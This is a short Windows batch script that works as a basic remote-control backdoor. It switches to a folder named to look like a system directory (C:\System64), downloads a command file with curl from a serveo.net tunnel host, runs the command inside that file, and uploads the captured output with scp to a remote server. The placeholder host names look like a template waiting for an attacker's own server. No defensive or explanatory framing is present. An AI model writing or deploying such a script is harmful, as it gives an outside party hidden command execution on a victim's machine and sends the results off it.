@echo off
cd C:\System64\
curl http://your_hostname.serveo.net/input.txt -o input.txt
set INPUT_FILE=input.txt
set OUTPUT_FILE=output.txt

if not exist %INPUT_FILE% (
    echo %INPUT_FILE% not found
    exit /b
)

set /p BATCH_SCRIPT=<%INPUT_FILE%
call %BATCH_SCRIPT% > %OUTPUT_FILE% 3>&1

cmd.exe /c "scp  "C:\System64\output.txt" server@your_hostname:/mnt/income/output.txt"